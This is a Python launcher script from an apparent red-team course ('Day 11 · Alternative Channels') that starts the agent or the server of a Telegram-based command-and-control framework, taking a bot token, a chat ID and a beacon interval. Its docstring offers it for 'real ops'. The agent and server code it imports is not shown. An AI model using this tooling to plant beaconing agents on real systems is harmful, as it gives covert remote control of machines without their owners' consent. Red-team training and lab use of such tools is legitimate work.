# c2_frameworks/telegram/run.py
"""
Quick-launch script for Telegram C2 (both agent & server)
One-liner execution for labs, demos, and real ops
"""

import os
import sys
import argparse

def banner():
    print("""
╔══════════════════════════════════════════════════════════╗
║              Telegram C2 – 30 Days of Red Team           ║
║                 Day 11 · Alternative Channels            ║
╚══════════════════════════════════════════════════════════╝
    """)

def main():
    parser = argparse.ArgumentParser(description="Telegram C2 Quick Launcher")
    parser.add_argument("mode", choices=["agent", "server"], help="Run as agent or server")
    parser.add_argument("--token", required=True, help="Bot token from @BotFather")
    parser.add_argument("--chat-id", help="Your personal chat ID (required for agent)")
    parser.add_argument("--interval", type=int, default=60, help="Beacon interval (agent only)")

    args = parser.parse_args()

    if args.mode == "agent":
        if not args.chat_id:
            print("[-] Agent mode requires --chat-id")
            sys.exit(1)

        banner()
        print(f"[+] Starting AGENT")
        print(f"[+] Session will appear in chat ID: {args.chat_id}\n")

        from .agent import TelegramC2Agent
        agent = TelegramC2Agent(args.token, args.chat_id, args.interval)
        agent.run()

    else:  # server
        banner()
        print(f"[+] Starting SERVER")
        print(f"[+] Send /start in your private chat with the bot\n")

        from .server import TelegramC2Server
        server = TelegramC2Server(args.token)
        server.run()

if __name__ == "__main__":
    main()